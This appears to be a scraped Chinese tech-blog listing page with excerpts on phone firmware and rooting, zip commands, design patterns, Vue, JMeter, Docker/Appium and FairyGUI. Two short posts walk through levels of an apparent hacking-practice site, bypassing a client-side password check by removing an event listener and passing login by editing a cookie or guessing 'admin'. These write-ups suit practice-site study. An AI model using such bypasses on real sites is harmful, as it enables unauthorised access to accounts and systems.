路径：设置-辅助功能-游戏模式-锁定屏幕亮度
系统提升手势导航使用流畅度
通知栏新增低电量模式快捷开关
录屏默认分辨率调整为720P
优化屏幕自动亮度逻辑
桌面新增Meizu Pay图标
问题改进
·输入法解决快捷短语删除失败的问题
修复偶现点击候选拼音无反应的现象
·系统解决部分场景下网络定位失败的问题
修复点击通知栏中的“开发者选项”无响应的现象
修复状态栏显示有通知，下拉通知栏后显示一段空白的现象
其他机型
功能调整：
游戏模式接入迅游加速快捷入口，提升游戏模式下的网络稳定性
路径：设置-辅助功能-游戏模式-迅游加速
桌面桌面新增Meizu Pay图标
问题改进修复手机瘦身时手机管家App闪退的现象
修复部分场景下邮件App闪退的现象
修复打开信息App后卡在智慧短信界面的现象
修复部分场景下播放抖音短视频自动灭屏的现象
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c46331052b87c84719acfd43c9a293d4/" rel="bookmark">
			魅蓝E 刷android,魅蓝e怎么root,或者怎么刷成android系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		魅蓝E怎么Root？ 魅蓝E手机刚刚发布没多久，现在，不少用户已经入手了这部手机。而在ROOT方面，魅蓝手机ROOT比较简单，因为系统自带了ROOT工具，无需借助第三方工具即可快速获取手机最高权限。那么，魅蓝E怎么Root?话不多说，以下是魅蓝E ROOT教程。 魅蓝E 魅蓝E Root教程 魅蓝E一键ROOT教程 一。从魅蓝E桌面依次点击进入「设置」-「Flyme账户」，然后使用Flyme账号登录，如图。 魅蓝E 设置 如果还没有Flyme账号，使用手机注册一个即可，如图所示。 魅蓝E 还没有账号?先注册一个 二。使用账号登录之后，再进入魅蓝E手机的「设置」-「指纹和安全」设置界面，如图所示。 魅蓝E 进入指纹和安全设置 三。继续打开「Root权限」选项，在弹出的ROOT提示界面，先勾选上「同意接受以上内容」并点击下方的-》「确定」，如图所示。 魅蓝E 勾选同意接受以上内容，确认ROOT 四。为了防止他人操作，进行魅蓝E ROOT操作前，需要再次输入一次Flyme密码，完成后手机会自动重启，如图所示。 魅蓝E 输入Flyme密码，确认ROOT 等到魅蓝E手机重启完成之后，再次进入「设置」-「指纹和安全」-「Root权限」设置界面，就可以看到ROOT成功了，完成后，就能拥有对手机的最高管理权限了。
取消
评论
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9b440750244fd56fe58c1b88eaeef2c/" rel="bookmark">
			zip 压缩命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 zip 命令为压缩命令，压缩后不覆盖源文件，可以压缩目录，一般后缀名为.zip用于压缩文件，其语法格式如下：
zip [选项] 文件名.zip /xxx/路径xxx/文件 常用参数选项如下：
-v	：可视化操作，显示压缩的执行过程，默认就是可视化 -q	： 静默操作，不显示指令执行过程 -r ：表示递归打包包含子目录的全部内容 -d	：从压缩文件内删除指定的文件 -n	：n为一个数字，压缩级别是从 1~9 的数字，-1 代表压缩速度更快，-9 代表压缩效果更好 -e ：加密压缩文件 -u	:追加文件到zip压缩包中 演示示例：
zip -vr etc.zip /etc/	#压缩/etc/目录，压缩文件名为etc.zip zip -d myfile.zip smart.txt	#删除压缩文件中的指定文件 zip -e passwd.zip /etc/passwd #加密压缩，需要输入密码 zip -u passwd.zip mypasww.txt	#追加mypasww.txt文件到压缩包中 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b849a3ae4a8a20bf7d54743b2a653e5f/" rel="bookmark">
			oppok1刷原生android10,OPPOK1系统升级最新ColorOSV6刷机包（完整固件rom下载ColorOSV6安卓9.0）...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OPPO K1搭载骁龙660处理器，3600毫安大电池，全新版本已经可以进行下载体验，优化人像模式拍照体验，优化相册交互，新增共享图集，分享精彩每一刻，新增图片、图集收藏功能，一键收藏重要图片，有需要的，可以进行下载了。
刷机有风险，操作需谨慎。刷机前请提前备份您的个人资料，以防资料丢失!
版本信息：
OPPO K1 (PBCM30) ColorOS V6
UI类型：Color OS
ROM大小：2497 M
Android系统版本：Android 9.0
更新日志：
优化 人像模式拍照体验
优化 相机交互
「相册」
优化 相册交互
新增 共享图集，分享精彩每一刻
新增 图片、图集收藏功能，一键收藏重要图片
「通信」
新增 骚扰拦截黑名单开头号码匹配，拦截特定号码开头的电话和短信
新增 来电闪光灯，锁屏或熄屏状态下来电时会有闪光灯提醒
新增 手机支持两个蓝牙音频设备同时连接，不同蓝牙音频支持快速切换
「设置」
新增 应用启动动画速度设置项
·新增 屏幕色彩模式，屏幕显示效果自由切换
来源：xcl
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b4071c322defef3bb662be99e86cc47/" rel="bookmark">
			oppok1刷原生android10,OPPO K1刷机教程_OPPO K1卡刷升级更新官方系统包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下面也是咱们的OPPO K1手机的相关的刷机操作了，这个刷机也是针对官方的固件rom包来进行的，之前给大家已经说过相关的固件rom包的下载了，不过有的机友是把固件包下载下来了，却不知道如何进行具体的刷机操作，所以在这里整理了一个详细的卡刷操作教程了，这个卡刷操作也不复杂，也是利用官方自带的recoery来给手机刷入一个官方原版的系统了，操作上也是很简单的，如果你也需要的话就一起来看看吧：
一：OPPO K1升级前的准备工作
1：下载官方原版的固件升级包，点击这里下载，下载下来先放到电脑上
2：确保手机能用usb数据线正常的连接电脑，连接电脑是为了把升级包复制到手机里
3：手机先备用一下重要的短信和联系人之类的信息
4：手机至少要有40%以上的电量才可以升级，切记：不要一边充电一边升级
二：OPPO K1开始升级操作：
1：首先，确认手机有足够的电量！
2：把上面下载好的rar格式的升级包在电脑上进行解压，如下图，然后找到zip格式的升级包(这个ozip格式的包不用解压)直接复制到手机存储根目录，最好是手机存储卡的根目录下
3：OK，现在把手机关机，关机之后，同时按住手机的【电源键】和【音量下键】，直到进入recovery模式，选择【简体中文】
4：然后选择【清除数据和缓存】，点击 【清除用户数据和缓存】直到完成
5：然后选择【安装升级文件】
6：接下来选择刚才复制到手机存储卡根目录下的zip格式的升级包，然后选择确定，接着就开始安装啦
7：安装完成后，重启或者继续安装
8：OK，重启就可以了
(本文来源) https://www.netded.com/a/jingpinshouji/2018/1023/37095.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06683a832588494521b03ee6ed3ae59a/" rel="bookmark">
			oppok1刷原生android10,oppok1刷机教程分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有的网友还不熟悉oppok1刷机的操作，而本节介绍了oppok1刷机操作，还不了解的朋友就跟着小编学习一下吧，希望对你们有所帮助。
oppok1刷机教程分享
一、刷机相关术语介绍
1.RE模式：RE全称Recovery指的是一种可以对安卓机内部的数据或系统进行修改的模式，也叫工程模式。在这个模式下我们可以刷入新的安卓系统，或者对已有的系统进行备份或升级。
进入方式：关机状态下按住关机键+音量-键手机震动一次后松开即可进入.
2.ROM包：论坛上下载的能刷入手机的一个包含手机系统文件的压缩包即叫ROM包，也叫固件包。
二、固件下载
⒈进入oppo官网社区首页会导航栏进入ColorOS 升级版块。
⒉找到OPPO K1对应的机型。
⒊点击立即下载即可，下载完成后可以看到一个后缀为OZIP的ROM包。
三、刷机教程
注：不管哪种方法刷机前一定要备份好自己的数据资料。
推荐使用系统自带备份与恢复软件 ：设置-&gt;其他设置-&gt;备份与恢复-&gt;如图。
⒈方法一：简单模式
使用手机在ColorOS升级中下载对应固件包，将后缀为OZIP的固件包粘贴进手机存储根目录，点击该‘固件’然后自动重启升级。
更新完成后自动重启即可使用。
⒉方法二：Recovery模式
在ColorOS升级中下载对应固件包，将手机用数据线连接上电脑，选择‘储存装置’，把后缀为OZIP的固件包放入手机根目录(根目录就是手机储存的最上面一个目录);或者直接用手机直接下载固件包，将后缀为OZIP的固件包放入手机根目录(根目录就是手机储存的最上面一个目录)。
粘贴进去后准备进入恢复模式，进入恢复模式的方法：
手机关机后，同时按住开机键和音量键，等手机产生震动即可松手，同时进入OPPO恢复模式。
直接点击‘简体中文’。
点击‘安装升级文件’。
点击‘从手机储存’。
找到放在根目录后缀为OZIP的固件包点击进行升级。
升级中，此时只需等待升级完成即可，不要做任何操作。
升级中刷机完成后直接点击‘重启’，完成刷机。
上文就讲解了oppok1刷机操作过程，希望有需要的朋友都来学习哦。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/475a2ddea88e1145a713092ed47b3fbe/" rel="bookmark">
			行为型模式之解释器模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在软件开发中，会遇到有些问题多次重复出现，而且有一定的相似性和规律性。如果将它们归纳成一种简单的语言，那么这些问题实例将是该语言的一些句子，这样就可以用“编译原理”中的解释器模式来实现了。
一，模式的定义与特点 解释器（Interpreter）模式的定义：给分析对象定义一个语言，并定义该语言的文法表示，再设计一个解析器来解释语言中的句子。也就是说，用编译语言的方式来分析应用中的实例。这种模式实现了文法表达式处理的接口，该接口解释一个特定的上下文。
这里提到的文法和句子的概念同编译原理中的描述相同，“文法”指语言的语法规则，而“句子”是语言集中的元素。例如，汉语中的句子有很多，“我是中国人”是其中的一个句子，可以用一棵语法树来直观地描述语言中的句子。
解释器模式是一种类行为型模式，其主要优点如下。
扩展性好。由于在解释器模式中使用类来表示语言的文法规则，因此可以通过继承等机制来改变或扩展文法。容易实现。在语法树中的每个表达式节点类都是相似的，所以实现其文法较为容易。 解释器模式的主要缺点如下。
执行效率较低。解释器模式中通常使用大量的循环和递归调用，当要解释的句子较复杂时，其运行速度很慢，且代码的调试过程也比较麻烦。会引起类膨胀。解释器模式中的每条规则至少需要定义一个类，当包含的文法规则很多时，类的个数将急剧增加，导致系统难以管理与维护。可应用的场景比较少。在软件开发中，需要定义语言文法的应用实例非常少，所以这种模式很少被使用到。 二，模式的结构与实现 解释器模式常用于对简单语言的编译或分析实例中，为了掌握好它的结构与实现，必须先了解编译原理中的“文法、句子、语法树”等相关概念。
文法 文法是用于描述语言的语法结构的形式规则。没有规矩不成方圆，例如，有些人认为完美爱情的准则是“相互吸引、感情专一、任何一方都没有恋爱经历”，虽然最后一条准则较苛刻，但任何事情都要有规则，语言也一样，不管它是机器语言还是自然语言，都有它自己的文法规则。例如，中文中的“句子”的文法如下。
〈句子〉::=〈主语〉〈谓语〉〈宾语〉 〈主语〉::=〈代词〉|〈名词〉 〈谓语〉::=〈动词〉 〈宾语〉::=〈代词〉|〈名词〉 〈代词〉你|我|他 〈名词〉7大学生I筱霞I英语 〈动词〉::=是|学习 注：这里的符号“::=”表示“定义为”的意思，用“〈”和“〉”括住的是非终结符，没有括住的是终结符。
句子 句子是语言的基本单位，是语言集中的一个元素，它由终结符构成，能由“文法”推导出。例如，上述文法可以推出“我是大学生”，所以它是句子。
语法树 语法树是句子结构的一种树型表示，它代表了句子的推导结果，它有利于理解句子语法结构的层次。图 1 所示是“我是大学生”的语法树。
有了以上基础知识，现在来介绍解释器模式的结构就简单了。解释器模式的结构与组合模式相似，不过其包含的组成元素比组合模式多，而且组合模式是对象结构型模式，而解释器模式是类行为型模式。
1.模式的结构 解释器模式包含以下主要角色。
抽象表达式（Abstract Expression）角色：定义解释器的接口，约定解释器的解释操作，主要包含解释方法 interpret()。终结符表达式（Terminal Expression）角色：是抽象表达式的子类，用来实现文法中与终结符相关的操作，文法中的每一个终结符都有一个具体终结表达式与之相对应。非终结符表达式（Nonterminal Expression）角色：也是抽象表达式的子类，用来实现文法中与非终结符相关的操作，文法中的每条规则都对应于一个非终结符表达式。环境（Context）角色：通常包含各个解释器需要的数据或是公共的功能，一般用来传递被所有解释器共享的数据，后面的解释器可以从这里获取这些值。客户端（Client）：主要任务是将需要分析的句子或表达式转换成使用解释器对象描述的抽象语法树，然后调用解释器的解释方法，当然也可以通过环境角色间接访问解释器的解释方法。 2.模式的实现 解释器模式实现的关键是定义文法规则、设计终结符类与非终结符类、画出结构图，必要时构建语法树。
//抽象表达式类 interface AbstractExpression { public void interpret(String info); //解释方法 } //终结符表达式类 class TerminalExpression implements AbstractExpression { public void interpret(String info) { //对终结符表达式的处理 } } //非终结符表达式类 class NonterminalExpression implements AbstractExpression { private AbstractExpression exp1; private AbstractExpression exp2; public void interpret(String info) { //非对终结符表达式的处理 } } //环境类 class Context { private AbstractExpression exp; public Context() { //数据初始化 } public void operation(String info) { //调用相关表达式类的解释方法 } } 三，模式的应用场景 前面介绍了解释器模式的结构与特点，下面分析它的应用场景。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/475a2ddea88e1145a713092ed47b3fbe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c586ada33af84bf18499cb0f4a2a1e78/" rel="bookmark">
			行为型模式之备忘录模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一，模式的定义与特点 在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态，以便以后当需要时能将该对象恢复到原先保存的状态。该模式又叫快照模式。
备忘录模式是一种对象行为型模式，其主要优点如下。
提供了一种可以恢复状态的机制。当用户需要时能够比较方便地将数据恢复到某个历史的状态。实现了内部状态的封装。除了创建它的发起人之外，其他对象都不能够访问这些状态信息。简化了发起人类。发起人不需要管理和保存其内部状态的各个备份，所有状态信息都保存在备忘录中，并由管理者进行管理，这符合单一职责原则。 其主要缺点是：资源消耗大。如果要保存的内部状态信息过多或者特别频繁，将会占用比较大的内存资源。
二，模式的结构与实现 备忘录模式的核心是设计备忘录类以及用于管理备忘录的管理者类。
1.模式的结构 备忘录模式的主要角色如下。
发起人（Originator）角色：记录当前时刻的内部状态信息，提供创建备忘录和恢复备忘录数据的功能，实现其他业务功能，它可以访问备忘录里的所有信息。备忘录（Memento）角色：负责存储发起人的内部状态，在需要的时候提供这些内部状态给发起人。管理者（Caretaker）角色：对备忘录进行管理，提供保存与获取备忘录的功能，但其不能对备忘录的内容进行访问与修改。 2.模式的实现 public class MementoPattern { public static void main(String[] args) { Originator or = new Originator(); Caretaker cr = new Caretaker(); or.setState("S0"); System.out.println("初始状态:" + or.getState()); cr.setMemento(or.createMemento()); //保存状态 or.setState("S1"); System.out.println("新的状态:" + or.getState()); or.restoreMemento(cr.getMemento()); //恢复状态 System.out.println("恢复状态:" + or.getState()); } } //备忘录 class Memento { private String state; public Memento(String state) { this.state = state; } public void setState(String state) { this.state = state; } public String getState() { return state; } } //发起人 class Originator { private String state; public void setState(String state) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c586ada33af84bf18499cb0f4a2a1e78/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/734460d9000713b46b3bbbc78fb9e44e/" rel="bookmark">
			行为型模式之迭代器模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现实生活以及程序设计中，经常要访问一个聚合对象中的各个元素，如“数据结构”中的链表遍历，通常的做法是将链表的创建和遍历都放在同一个类中，但这种方式不利于程序的扩展，如果要更换遍历方法就必须修改程序源代码，这违背了 “开闭原则”。
既然将遍历方法封装在聚合类中不可取，那么聚合类中不提供遍历方法，将遍历方法由用户自己实现是否可行呢？答案是同样不可取，因为这种方式会存在两个缺点：
暴露了聚合类的内部表示，使其数据不安全；增加了客户的负担。 “迭代器模式”能较好地克服以上缺点，它在客户访问类与聚合类之间插入一个迭代器，这分离了聚合对象与其遍历行为，对客户也隐藏了其内部细节，且满足“单一职责原则”和“开闭原则”，如 [Java] 中的 Collection、List、Set、Map 等都包含了迭代器。
迭代器模式在生活中应用的比较广泛，比如：物流系统中的传送带，不管传送的是什么物品，都会被打包成一个个箱子，并且有一个统一的二维码。这样我们不需要关心箱子里是什么，在分发时只需要一个个检查发送的目的地即可。再比如，我们平时乘坐交通工具，都是统一刷卡或者刷脸进站，而不需要关心是男性还是女性、是残疾人还是正常人等信息。
一，模式的定义与特点 迭代器（Iterator）模式的定义：提供一个对象来顺序访问聚合对象中的一系列数据，而不暴露聚合对象的内部表示。迭代器模式是一种对象行为型模式，其主要优点如下。
访问一个聚合对象的内容而无须暴露它的内部表示。遍历任务交由迭代器完成，这简化了聚合类。它支持以不同方式遍历一个聚合，甚至可以自定义迭代器的子类以支持新的遍历。增加新的聚合类和迭代器类都很方便，无须修改原有代码。封装性良好，为遍历不同的聚合结构提供一个统一的接口。 其主要缺点是：增加了类的个数，这在一定程度上增加了系统的复杂性。
在日常开发中，我们几乎不会自己写迭代器。除非需要定制一个自己实现的数据结构对应的迭代器，否则，开源框架提供的 API 完全够用。
二，模式的结构与实现 迭代器模式是通过将聚合对象的遍历行为分离出来，抽象成迭代器类来实现的，其目的是在不暴露聚合对象的内部结构的情况下，让外部代码透明地访问聚合的内部数据。
1.模式的结构 迭代器模式主要包含以下角色。
抽象聚合（Aggregate）角色：定义存储、添加、删除聚合对象以及创建迭代器对象的接口。具体聚合（ConcreteAggregate）角色：实现抽象聚合类，返回一个具体迭代器的实例。抽象迭代器（Iterator）角色：定义访问和遍历聚合元素的接口，通常包含 hasNext()、first()、next() 等方法。具体迭代器（Concretelterator）角色：实现抽象迭代器接口中所定义的方法，完成对聚合对象的遍历，记录遍历的当前位置。 2.模式的实现 public class IteratorPattern { public static void main(String[] args) { Aggregate ag = new ConcreteAggregate(); ag.add("中山大学"); ag.add("华南理工"); ag.add("韶关学院"); System.out.print("聚合的内容有："); Iterator it = ag.getIterator(); while (it.hasNext()) { Object ob = it.next(); System.out.print(ob.toString() + "\t"); } Object ob = it.first(); System.out.println("\nFirst：" + ob.toString()); } } //抽象聚合 interface Aggregate { public void add(Object obj); public void remove(Object obj); public Iterator getIterator(); } //具体聚合 class ConcreteAggregate implements Aggregate { private List&lt;Object&gt; list = new ArrayList&lt;Object&gt;(); public void add(Object obj) { list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/734460d9000713b46b3bbbc78fb9e44e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8a01c51574f9cf87397c9670aedd786/" rel="bookmark">
			Vue 06 下
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vue 06 前端工程化 基本概念介绍 软件工程：可行性分析、需求分析、设计（概要设计、详细设计）、软件开发、测试、实施（运维）
前端工程化：独立的设计、独立的开发、独立测试、独立运维
为了实现更加方便的前端工程化，Vue的技术栈提供了一个非常方便的工具：脚手架。
脚手架可以非常方便快速的让前端开发人员基于前端工程化的模式进行项目开发
脚手架基本使用 安装脚手架 npm install -g @vue/cli 查看版本号 # 如果看到了版本号就证明安装成功了 vue --version 基于脚手架创建项目 # project-demo 为项目的名称 vue create mydemo 启动项目 # 切换到项目目录 cd mydemo # 启动项目 npm run serve 浏览器地址栏输入如下地址，如果能看到页面效果，证明项目已经启动成功 http://localhost:8080/ 脚手架项目结构分析 |-public -----------------------------------------------单页面
|-src --------------------------------------------------项目源代码 |-assets -------------------------------------------项目用到的相关资源
|-components ---------------------------------------Vue组件 |-App.vue ------------------------------------------项目跟组件 |-main.js ------------------------------------------项目入口文件
|-.gitignore -------------------------------------------git配置文件（忽略文件管理）
|-babel.config.js --------------------------------------babel配置文件（控制ES6编译）
|-package.json -----------------------------------------项目包管理文件
|-README.md --------------------------------------------项目说明文档
ES6模块化开发 CommonJS模块化规范
1.导出 module.exports = {}
2.导入 require()
Node.js中的模块化导入和导出
导出：module.exports
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8a01c51574f9cf87397c9670aedd786/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b20e42c142289073b69a6152eed9d50/" rel="bookmark">
			JMeter-响应断言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言： 断言用于对采样器执行结果的检查，并在同一范围内的每个采样器之后进行处理。如果要对某个采样器进行断言，直接将断言添加到采样器的子集即可。
为什么要用断言？
JMeter以及Postman等接口测试工具，他们都是基于协议进行工作的，使用这些工具进行发送请求，当请求发送成功的时候（即协议发送成功），在查看结果树中请求样本显示绿色。比如协议状态码是200就是成功，也是仅仅代表协议发送成功，但是业务不一定成功。有可能是协议发送成功了，但是业务没有成功，但是JMeter默认不做判断。那么想要校验业务成功还是失败，就得需要进行断言，断言根据接口的响应进行断言，一般主要断言业务状态码以及messege等信息。
1、新建响应断言 2、怎么判断JMeter响应断言成功？
举个实JMeter断言成功，在查看结果树中请求是绿色，看不到断言成功的信息。当JMeter断言失败的时候，结果树中显示为红色，可以看到断言失败的信息。
2、响应断言 断言页面的解释： 一、Apply to:
1.名称：自行定义，就是节点的名称
2.注释：节点的注释，容易理解的解释
3.Apply to:断言可以应用于主样本，子样本或者两者。默认断言是第二个，断言应用于主样本。
（1）Main sample and sub-samples：主样本和子样本
（2）Main sample only：仅主样本
（3）Sub-samples only：仅子样本
（4）JMeter Variable Name to use：JMeter使用变量名字，断言将应用于命名变量的内容
正则表达式与响应断言结合： 这里讲一下JMeter Variable Name to use：JMeter使用变量名字，断言将应用于命名变量的内容。我尝试了一下，可以这样用，有错的麻烦提出。
断言正确，如果正则中的变量名和断言中的变量名不一致，断言则会失败。
3、模式匹配规则(Pattern Mactching Rules) 1.包括(Contains)：返回的结果包括所指定的内容，支持正则匹配
接口的响应
进行断言，断言通过。
2.匹配：
与Equals几乎一样，都是断言要和返回值完全一致。不同的是，这里支持正则，写正则表达式时，正则表达式也要完全和返回值匹配，才能够通过。
3.Equals:
返回结果与你指定断言完全一致，不支持正则匹配。注意是完全一致，这个只有一个特殊情况会用到，一般很少用。
4.SubString
与“包括”功能类似，不同点为，不支持正则匹配。
5.否
反之，非 的意思
6.或者
可以为多个值，可在下面，例如一个断言里面可能有两个不同的判断值，可以选中去用，当满足一个要求的时候，就算成功。这个功能还是可以多用的，像上面那个例子，多断言几种情况。
4、Custom failure message功能 在查看结果树中可以看到刚才填写的断言的信息：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/047da228a8f50d8303fdccb71475d934/" rel="bookmark">
			力扣解题思路：面试题 17.13. 恢复空格 纠错记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面试题 17.13. 恢复空格 思路：
先看错误答案：
public int respace(String[] dictionary, String sentence) { int[] dp = new int[sentence.length()+1]; for(int i=0;i&lt;=sentence.length();i++) dp[i] = i; for(int i=1;i&lt;=sentence.length();++i){ for(String word:dictionary){ if(word.length()&lt;=i){ if(word.equals(sentence.substring(i-word.length(),i))) dp[i]=Math.min(dp[i-1]+1,Math.min(dp[i],dp[i-word.length()])); } } } return dp[sentence.length()]; } 很常见的动态规划，但是测试用例的输出结果总是比实际大，仔细看会发现中间的两层if循环是有问题的，因为一旦这两个if其中有一个的结果不为true，动态数组将不被更新，这就是问题所在，所以我们应该加个else，不过如果加else可能要加两个，不如最后做个统一处理：
public int respace(String[] dictionary, String sentence) { int[] dp = new int[sentence.length()+1]; for(int i=0;i&lt;=sentence.length();i++) dp[i] = i; for(int i=1;i&lt;=sentence.length();++i){ for(String word:dictionary){ if(word.length()&lt;=i){ if(word.equals(sentence.substring(i-word.length(),i))) dp[i]=Math.min(dp[i],dp[i-word.length()]); } dp[i] = Math.min(dp[i],dp[i-1]+1); } } return dp[sentence.length()]; } 这个处理器是也可以放在前面，也就是第一层循环下（因为这里必须会执行），这时候甚至可以代替初始化，因此不用再初始化了（但是dp[0] = 0是需要的）：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/047da228a8f50d8303fdccb71475d934/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03684604a3e27504b7e3ab6fa3047c11/" rel="bookmark">
			fj543-第3关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第3关地址：http://www.fj543.com/hack/?level=3login
都没有登录界面，我也不知道自己登录了没有。
正常情况下，登录状态都是和Session绑定的，会放在服务器。
但是也不排除一部分信息放在Cookie，于是尝试查看。
login为no，这个就是所谓的“说我没有登录”吧？
我说我登录了呢？
修改后，刷新网页就通关了。
New Way：
猜测默认密码为：admin。
收获：知道编辑Cookie了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13183ebafdc14e75414239f153bb2eb9/" rel="bookmark">
			fj543-第2关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第2关地址：http://www.fj543.com/hack/?level=222
直接查看源代码。
看chkPassword始终返回false，表单无法提交。
这里的代码可以直接编辑生效（比如删掉οnsubmit="return chkPassword()"），但是对已经绑定的事件不起作用。
此时可以用Event Listeners标签查看当前元素绑定的事件。
Remove掉即可点进下一关。
第3关地址：http://www.fj543.com/hack/?level=3login
收获：使用Event Listeners标签查看当前元素绑定的事件。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da5ae1c638fb22a92dbaa516156c8c75/" rel="bookmark">
			docker android模拟器,「docker实战篇」python的docker-创建appium容器以及设置appium容器连接安卓模拟器（31）...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一节已经下载好了appium的镜像，接下来说下如何创建appium如何创建容器和模拟器如何连接appium容器。源码：https://github.com/limingios/dockerpython.git (源码/「docker实战篇」python的docker-创建appium容器以及设置appium容器连接安卓模拟器(30))
appium的docker镜像的介绍
&gt;官网地址：https://github.com/appium/appium-docker-android
启动appium容器
docker run --privileged -d -p 4723:4723 --name appium1 appium/appium
说明启动成功
容器启动后，启动安卓模拟器
&gt;启动安卓模拟器后，通过cmd输入
adb devices
改变连接方式，从usb更改为tcp-ip的方式
adb -s 127.0.0.1:62001 tcpip 55555
使用docker的appium连接模拟器
1.设置成桥接
重启模拟器，可能无法获取ip，点击下开关，然后自动获取下就可以了。
2.查看模拟器的ip地址
虚拟机docker连接模拟器
ping 192.168.1.120
docker exec -it appium1 adb connect 192.168.1.120:55555
docker exec -it appium1 adb devices
4.测试python，运行docker appium，运行模拟器
启动
docker ps -a
docker logs -f appium1
python代码
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time : 2019/3/12 15:11
# @Author : Aries
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da5ae1c638fb22a92dbaa516156c8c75/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ab0384e9255f88a0151f91514a3c054/" rel="bookmark">
			fairygui绑定android,FairyGUI在Cocos2d-x下的多平台接入和lua绑定
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		接入前确保你的项目在接入前可以通过cocos compile -p xxx 命令正常编译打包，每接入一个平台都可以通过此命令编译打包以确认是否接入正常。
预备
复制libfairygui到frameworks\cocos2d-x\cocos\editor-support\fairygui
修改CCLabel.h的672行，void updateBMFontScale();前添加virtual
绑定tolua
编写cocos2d-x\tools\tolua\cocos2dx_fairygui.ini，修改ini里的headers字段，后面添加LuaBasicConversions_fairygui.h，这样生成的auto文件才会inlucde。还是用我的吧。
修改 cocos2d-x\tools\tolua\genbindings.py，添加fairygui一行：
'cocos2dx_fairygui.ini' : ('cocos2dx_fairygui', 'lua_cocos2dx_fairygui_auto'), \
修改cocos2d-x\tools\bindings-generator\targets\lua\conversions.yaml里的ns_map:下添加fairygui的命名空间"fairygui::": "fgui."，另外，还要分别在中间和底部添加下面代码，以便处理Margin类型的转换。
"Margin": "ok &amp;= luaval_to_margin(tolua_S, ${arg_idx}, &amp;${out_value}, \"${lua_namespaced_class_name}:${func_name}\")"
"Margin": "margin_to_luaval(tolua_S, ${in_value})"
在frameworks\cocos2d-x\cocos\scripting\lua-bindings\manual下新建fairygui目录，把下面四个文件拷进去。
lua_cocos2dx_fairygui_manual.hpp
lua_cocos2dx_fairygui_manual.cpp
LuaBasicConversions_fairygui.h
LuaBasicConversions_fairygui.cpp
在cmd中，切换到frameworks\cocos2d-x\tools\tolua目录，运行python genbindings.py，正常的话会在frameworks\cocos2d-x\cocos\scripting\lua-bindings\auto生成两个文件：
lua_cocos2dx_fairygui_auto.hpp
lua_cocos2dx_fairygui_auto.cpp
修改frameworks\cocos2d-x\cocos\scripting\lua-bindings\manual\lua_module_register.cpp，添加
#include "scripting/lua-bindings/manual/fairygui/lua_cocos2dx_fairygui_manual.hpp"
在lua_module_register中添加
register_all_cocos2dx_fairygui_manual(L);
接入Win32
在VS工程右键“添加” “现有项目”，找到libfairygui.vcxproj，在VS左侧下端选择“属性管理器”，展开libfairygui，在Debug和Release中分别添加现有属性表“cocos2dx.props”和“cocos2d_headers.props”，在cocos2d\2d目录下可以找到。
在VS中的libluacocos2d下的manual中新建项fairygui，并把四个文件添加进去。
打开属性表的“cocos2dx.props”,通用属性|链接器|输入|附加依赖项，添加libfairygui.lib
接入ios_mac
